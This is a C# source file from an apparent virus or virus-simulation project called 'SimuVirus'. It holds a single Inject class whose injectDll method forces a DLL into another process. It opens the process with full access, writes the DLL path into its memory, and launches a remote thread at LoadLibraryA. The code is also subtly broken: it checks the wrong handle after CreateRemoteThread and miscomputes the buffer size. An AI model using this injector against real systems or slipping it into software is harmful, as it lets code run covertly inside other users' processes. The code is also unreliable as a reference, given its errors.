using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SimuVirus.tools;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace SimuVirus.deploy
{
    class Inject
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public IntPtr pRemoteBuf;
        

        public bool injectDll(int dwPID, byte[] szDllPath)
        {
            /*
            string arguments = szDllPath + " " + dwPID;
            Process process = new Process();
            process.StartInfo.FileName = exePath;
            process.StartInfo.Arguments = arguments;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            */
            
            uint dwBufSize = (uint)((szDllPath.Length + 1) * 2);
            IntPtr res;
            IntPtr pThreadProc;

            hProcess = api.OpenProcess(api.ProcessAccessFlags.All, false, dwPID);
            if (hProcess == IntPtr.Zero)
                return false;

            pRemoteBuf = api.VirtualAllocEx(hProcess, IntPtr.Zero, dwBufSize, api.AllocationType.Commit | api.AllocationType.Reserve, api.MemoryProtection.ReadWrite);
            if (pRemoteBuf == IntPtr.Zero)
                return false;

            bool result = api.WriteProcessMemory(hProcess, pRemoteBuf, szDllPath, dwBufSize, out res);
            if (!result)
                return false;
            pThreadProc = api.GetProcAddress(api.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            if (pThreadProc == IntPtr.Zero)
                return false;

            hThread = api.CreateRemoteThread(hProcess, IntPtr.Zero, 0, pThreadProc, pRemoteBuf, 0, IntPtr.Zero);
            if (pThreadProc == IntPtr.Zero)
                return false;

            api.WaitForSingleObject(hThread, 0xFFFFFFFF);
            api.CloseHandle(hThread);
            api.CloseHandle(hProcess);
            return true;
            
        }
    }
}
